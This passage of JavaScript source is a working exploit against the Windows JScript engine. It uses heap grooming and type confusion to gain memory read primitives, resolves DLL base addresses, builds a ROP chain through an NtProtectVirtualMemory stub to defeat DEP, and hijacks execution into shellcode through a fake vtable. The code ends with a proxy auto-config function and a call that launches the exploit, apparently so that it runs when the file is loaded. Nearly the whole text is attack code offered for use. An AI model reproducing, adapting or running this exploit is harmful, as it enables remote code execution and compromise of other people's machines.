    FakeVtable += DwordArrayToBytes([ShellcodeAddress]);
    FakeVtable += DwordArrayToBytes([0x11111111]); // Shellcode will return to this pseudo-address
    
    // Padding on the end of the vtable is not needed: both NtProtectVirtualMemory and the shellcode will be using memory below this address
    
    return FakeVtable;
}

function NullSanitizeWord(StrWord) {
    var Sanitized = 0;
    
    if(StrWord != 0) {
        if((StrWord & 0x00FF) == 0) {
            Sanitized = 0; // First byte is NULL, end of the string.
        }
        else {
            Sanitized = StrWord;
        }
    }
    
    return Sanitized;
}

function BinaryCmp(TargetNum, CmpNum) { // return -1 for TargetNum being greater, 0 for equal, 1 for CmpNum being greater
    if(TargetNum == CmpNum) {
        return 0;
    }
    
    while(true) {
        if((TargetNum & 0xff) > (CmpNum & 0xff)) {
            return -1;
        }
        else if((TargetNum & 0xff) < (CmpNum & 0xff)) {
            return 1;
        }
        
        TargetNum = TargetNum >> 8;
        CmpNum = CmpNum >> 8;
    }
}

function DwordToUnicode(Dword) {
    var Unicode = String.fromCharCode(Dword & 0xFFFF);
    Unicode += String.fromCharCode(Dword >> 16);
    return Unicode;
}

function TableToUnicode(Table) {
    var Unicode = "";
    
    for(var i = 0; i < Table.length; i++) {
        Unicode += DwordToUnicode(Table[i]);
    }

    return Unicode;
}

function DwordArrayToBytes(DwordArray) {
    var ByteArray = [];
    
    for(var i = 0; i < DwordArray.length; i++) {
        ByteArray.push(DwordArray[i] & 0xffff);
        ByteArray.push((DwordArray[i] & 0xffff0000) >> 16);
    }
    
    return String.fromCharCode.apply(null, ByteArray);
}

function StrcmpLeak32(StrDwordTable, LeakAddress) { // Compare two strings between an array of WORDs and a string at a memory address
    var TargetTableIndex = 0;
    
    while (TargetTableIndex < StrDwordTable.length) {
        var LeakStrWord = LeakWord32(LeakAddress + (4 * TargetTableIndex));
        var SanitizedStrWord = NullSanitizeWord(LeakStrWord);
        var TableWord = (StrDwordTable[TargetTableIndex] & 0x0000FFFF);
        
        if(TableWord == SanitizedStrWord) {
            LeakStrWord = LeakWord32((LeakAddress + (4 * TargetTableIndex) + 2));
            SanitizedStrWord = NullSanitizeWord(LeakStrWord);
            TableWord = ((StrDwordTable[TargetTableIndex] & 0xFFFF0000) >> 16);

            if(TableWord == SanitizedStrWord) {
                if((TargetTableIndex + 1) >= StrDwordTable.length) {
                    return true;
                }

                TargetTableIndex++;
            }
            else {
                break;
            }
        }
        else {
            break;
        }
    }
    
    return false;
}

var LFHBlocks = new Array();

function Exploit() {
    // Initialization
    
    if(WindowsVersion <= 7) {
        ReClaimNameList = ReClaimIndexNameList;
        NameListAnchorCount = 20000;
    }
    else {
        ReClaimNameList = ReClaimBackupNameLists;
        NameListAnchorCount = 40000; // The larger this number the more reliable the exploit on Windows 8.1 where LFH cannot easily re-claim
    }

    // Trigger LFH for a size of 0x648

    for(var i = 0; i < 50; i++) {
        Temp = new Object();
        Temp[Array(379).join('A')] = 1; // Property name size of 0x17a (378) will produce an allocation of 0x648 bytes
        LFHBlocks.push(Temp);
    }
    
    // New set of untracked vars in freed GcBlock
    
    NewUntrackedVarSet();

    // Re-claim with type confusion NameLists
    
    for(var i = 0; i < NameListAnchorCount; i++) {
        NameListAnchors[i][SizerPropName] = 1; // 0x17a property name size for 0x648 NameList allocation size
        NameListAnchors[i]["BBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
        NameListAnchors[i]["\u0003"] = 1; // This ends up in the VVAL hash/name length to be type confused with an integer VAR
        NameListAnchors[i]["C"] = i; // The address of this VVAL will be leaked
    }
    
    EndTimer("Infoleak VAR creation + re-claim");
    
    // Leak final VVAL address from one of the NameLists
    
    AnchorObjectsBackup = NameListAnchors; // Prevent it from being freed and losing our leaked pointer

    var LeakedVvalAddress = 0;
    
    for(var i = 0; i < UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number" && UntrackedVarSet[i] > 0x1000) {
            LeakedVvalAddress = UntrackedVarSet[i];
            break;
        }
    }

    DebugLog("leaked final VVAL address of " + LeakedVvalAddress.toString(16));
    
    if(LeakedVvalAddress != 0) {
        var PrimaryVvalPropName = "AA"; // 2 wide chars (4 bytes) plus the 4 byte BSTR length gives 8 bytes: the size of the two GcBlock linked list pointers. Everything after this point can be fake VARs and a tail padding.

        for(var i = 0; i < 46; i++) {
            PrimaryVvalPropName += CreateVar32(0x80, LeakedVvalAddress, 0); // Type 0x80 is a VAR reference
        }
        
        while(PrimaryVvalPropName.length < 0x17a) PrimaryVvalPropName += "A"; // Dynamically pad the end of the proeprty name to a length of 0x17a

        // New set of untracked vars in freed GcBlock
        
        NewUntrackedVarSet();
        
        // Re-claim with leaked VVAL address vars (to be dereferenced for anchor object index extraction)
        
        for(var i = 0; i < NameListAnchorCount; i++) {
            NameListAnchors[i][PrimaryVvalPropName] = 1;
        }
        
        // Extract NameList anchor index through untracked var dereference to leaked VVAL prefix VAR
        
        var LeakedVvalVar;

        for(var i = 0; i < UntrackedVarSet.length; i++) {
            if(typeof UntrackedVarSet[i] === "number") {
                LeakedAnchorIndex = parseInt(UntrackedVarSet[i] + ""); // Attempting to access the untracked var without parseInt will fail ("null or not an object")
                LeakedVvalVar = UntrackedVarSet[i]; // The + "" trick alone does not seeem to be enough to populate this with the actual value
                break;
            }
        }
        
        // Verify that the VAR within the leaked VVAL can be influenced by directly freeing/re-claiming the NameList associated with the leaked NameList anchor object (whose index is now known)
        
        ReClaimNameList(0x11, "A");
        
        if(LeakedVvalVar + "" == 0x11) {
            // Create the mutable variable which will be used throughout the remainder of the exploit
            
            DebugLog("Leaked anchor object re-claim verification success");
            ReClaimNameList(0, CreateVar32(0x3, 0x22, 0));
            
            var PrimaryVvalPropName = "AA"; // 2 wide chars (4 bytes) plus the 4 byte BSTR length gives 8 bytes: the size of the two GcBlock linked list pointers. Everything after this point can be fake VARs and a tail padding.

            for(var i = 0; i < 46; i++) {
                PrimaryVvalPropName += CreateVar32(0x80, LeakedVvalAddress + 0x30, 0); // +0x30 is the offset to property name field of 32-bit VVAL struct. Type 0x80 is a VAR reference
            }
            
            while(PrimaryVvalPropName.length < 0x17a) PrimaryVvalPropName += "A"; // Dynamically pad the end of the proeprty name to a length of 0x17a
            
            // New set of untracked vars in freed GcBlock
            
            NewUntrackedVarSet();
            
            // Re-claim with leaked VVAL name property address vars (this is the memory address of the mutable variable that will be created)
            
            for(var i = 0; i < NameListAnchorCount; i++) {
                NameListAnchors[i][PrimaryVvalPropName] = 1;
            }
            
            for(var i = 0; i < UntrackedVarSet.length; i++) {
                if(typeof UntrackedVarSet[i] === "number") {
                    if(UntrackedVarSet[i] + "" == 0x22) {
                        MutableVar = UntrackedVarSet[i];
                        break;
                    }
                }
            }
            
            // Verify the mutable var can be changed via simple re-claim
            
            ReClaimNameList(0, CreateVar32(0x3, 0x33, 0));
            
            if(MutableVar + "" == 0x33) {
                // Test arbitrary read primitive
                
                DebugLog("Verified mutable variable modification via re-claim");
                
                if(LeakByte32(LeakedVvalAddress + 0x30) == 0x8) { // Change mutable var to a BSTR pointing at itself.
                    // Derive jscript.dll base from leaked Object vtable
                
                    DebugLog("Memory leak test successful");
                    StartTimer();
                    
                    var DissectedObj = new Object();
                    var ObjectAddress = LeakObjectAddress32(LeakedVvalAddress, DissectedObj);
                    var VtableAddress = LeakDword32(ObjectAddress);
                    
                    DebugLog("Leaked vtable address: " + VtableAddress.toString(16));
                    
                    var JScriptBase = DiveModuleBase32(VtableAddress);
                    
                    if(JScriptBase != 0) {
                        // Extract the first Kernel32.dll import from Jscript.dll IAT to dive for its base
                        
                        EndTimer("JScriptBase base leak");
                        DebugLog("Leaked JScript base address: " + JScriptBase.toString(16));
                        
                        StartTimer();
                        var Kernel32ImportX = ExtractBaseFromImports32(JScriptBase, [0x4e52454b, 0x32334c45]);
                        
                        if(Kernel32ImportX != 0) {
                            EndTimer("Kernel32 random import leak");
                            StartTimer();
                            
                            var Kernel32Base = DiveModuleBase32(Kernel32ImportX);
                            
                            if(Kernel32Base != 0) {
                                EndTimer("Kernel32.dll base resolution");
                                DebugLog("Successfully resolved kernel32.dll base at 0x" + Kernel32Base.toString(16));
                                StartTimer();
                                
                                // Obtain the address of NtProtoectVirtualMemry via the imports of Kernel32.dll (which always imported NtProtoectVirtualMemry from NTDLL.DLL). This can be expensive operation, thus a hint may be used to skip ahead to the correct IAT/INT index for NtProtoectVirtualMemry depending on the version of Kernel32.dll

                                var HintIndex = 0;
                                
                                if(WindowsVersion == 7) {
                                    HintIndex = 141;
                                }
                                else if(WindowsVersion == 8.1) {
                                    HintIndex = 84;
                                }
                                
                                var NtProtectAddress = ResolveImport32(Kernel32Base, HintIndex, [0x6c64746e, 0x6c642e6c], [0x7250744e, 0x6365746f]); // 'rPtN' 'ceto'
                                
                                if(NtProtectAddress != 0) {
                                    EndTimer("NtProtoectVirtualMemry resolution");
                                    DebugLog("Successfully resolved NtProtoectVirtualMemry address from kernel32.dll IAT: " + NtProtectAddress.toString(16));

                                    // Obtain a random MSVCRT.DLL import from Jscript.dll and use it to identify the base of MSVCRT.DLL: it is from MSVCRT.DLL that the ROP gadgets will be harvested
                                    
                                    StartTimer();
                                    var MsvcrtImportX = ExtractBaseFromImports32(JScriptBase, [0x6376736d, 0x642e7472]);
                                    var MsvcrtBase = DiveModuleBase32(MsvcrtImportX);
                                    EndTimer("MsvcrtBase base leak");
                                    StartTimer();
                                    var RopGadgetSet = ResolveGadgetSet32(MsvcrtBase);
                                    EndTimer("ROP gadget resolution");
                                    
                                    if(RopGadgetSet != null) {
                                        // NtProtoectVirtualMemry cannot/should not be used as the direct address for disabling DEP. EMET may have hooked it. Therefore, hunt for another SYSCALL in NTDLL.DLL which has the same number of paraameters (same RETN value) as NtProtoectVirtualMemry and use it as a stub.
                                    
                                        StartTimer();
                                        var NtProtectProxyStubAddress = ResolveNtProtectProxyStub32(NtProtectAddress, 0x1000);
                                        EndTimer("NtProtoectVirtualMemry proxy stub resolution");
                                        
                                        if(NtProtectProxyStubAddress != 0) {
                                            // Convert the shellcode from a DWORD array into a BSTR and leak its address in memory.
                                            
                                            StartTimer();
                                            var ShellcodeStr = TableToUnicode(Shellcode);
                                            var ShellcodeLen = (ShellcodeStr.length * 2);
                                            DebugLog("Shellcode length: 0x" + ShellcodeLen.toString(16));
                                            ShellcodeStr = ShellcodeStr.substr(0, ShellcodeStr.length); // This trick is essential to ensure the "address of" primitive gets the actual address of the shellcode data and not another VAR in a chain of VARs (this happens when a VAR is appended to another repeaatedly as is the case here)
                                            var ShellcodeAddress = LeakObjectAddress32(LeakedVvalAddress, ShellcodeStr);
                                            DebugLog("ShellcodeAddress address: " + ShellcodeAddress.toString(16));
                                            
                                            // NtProtoectVirtualMemry has several parameters which are in/out pointers. Thus we must have a +RW region of memory whose contents we control and address we have leaked to carry these values.
                                            
                                            var WritableStr = "";
                                            WritableStr += DwordArrayToBytes([0]);
                                            WritableStr += DwordArrayToBytes([ShellcodeAddress]);
                                            WritableStr += DwordArrayToBytes([ShellcodeLen]);
                                            WritableStr += DwordArrayToBytes([0]);
                                            WritableStr = WritableStr.substr(0, WritableStr.length);
                                            var WritableAddress = LeakObjectAddress32(LeakedVvalAddress, WritableStr);
                                           
                                            // Create the fake vtable for the mutable var. The Typeof method of this vtable is what will be used to trigger the EIP hijack. Since the vtable serves as dual-role as both a vtable and an artificial stack (after the stack pivot) extra space/padding is used to accomodate this (NtProtectVirtualMemory itself will require this space for its stack usage)
                                            
                                            var FakeVtablePaddingSize = 0x10000; // 64KB should be plenty to accomodate stack usage within NtProtectVirtualMemory and within shellcode (if it does not stack pivot on its own)
                                            var FakeVtable = CreateFakeVtable32(FakeVtablePaddingSize, 0x200, NtProtectProxyStubAddress, ShellcodeAddress, RopGadgetSet, WritableAddress); // Doing this in a separate function is crucial for the AddressOf primitive to work properly. Concatenated vars in the same scope end up as a linked list of VARs
                                            FakeVtable = FakeVtable.substr(0, FakeVtable.length); // Nice trick to fix the AddressOf primitive. VARs created with multiple concats of other VARs end up as a linked list of VARs
                                            
                                            // Re-claim NameList with mutable var set to region AFTER its own VAR in property name (as type 0x81). At this location in property name (+8 because of Type from generated VAR) the "object pointer" of the additional VAR (the fake vtable address) should be pointing at fake vtable BSTR +4 (to skip length
                                            
                                            var FakeVtableAddress = (LeakObjectAddress32(LeakedVvalAddress, FakeVtable) + FakeVtablePaddingSize);
                                            EndTimer("Building shellcode, fake vtable, writable objects");
                                            DebugLog("Fake vtable address: " + FakeVtableAddress.toString(16));
                                            ReClaimNameList(0, CreateVar32(0x81, LeakedVvalAddress + 0x30 + 16 + 8, 0) + CreateVar32(0, FakeVtableAddress, 0)); // VAR in VVAL will be a type 0x81 (not type 0x80) VAR. The 0x81 VAR pointer goes to the allocated (Array) object, the first 4 bytes of which are a vtable within jscript.dll. In short, 0x80 references a VAR while 0x81 references an actual object.
                                            DebugLog("Executing stack pivot for DEP bypass at " + RopGadgetSet.StackPivot.toString(16));
                                            typeof MutableVar;
                                            DebugLog("Clean return from shellcode");
                                        }
                                        else {
                                            DebugLog("Failed to resolve NtProtoectVirtualMemry proxy stub via opcode scan");
                                        }
                                    }
                                    else {
                                        DebugLog("Fatal error: unable to dynamically resolve ROP gadget addresses");
                                    }
                                }
                                else {
                                    DebugLog("Failed to resolve NtProtoectVirtualMemry from kernel32.dll IAT");
                                }
                            }
                            else {
                                DebugLog("Failed to identify Kernel32.dll base address via import " + Kernel32ImportX.toString(16));
                            }
                        }
                        else {
                            DebugLog("Failed to identify raandom kernel32.dll import address from JScript.dll IAT");
                        }
                    }
                    else {
                        DebugLog("Failed to leak JScript.dll base address");
                    }
                }
                else {
                    DebugLog("Memory leak test failed");
                }
            }
            else {
                DebugLog("Failed to verify mutable variable modification via re-claim");
            }
        }
        else {
            DebugLog("Failed to extract final VVAL index via re-claim");
        }
    }
    else {
        DebugLog("Leaked anchor object type confusion re-claim failed");
    }
}

function FindProxyForURL(url, host){
    return "DIRECT";
}

Exploit();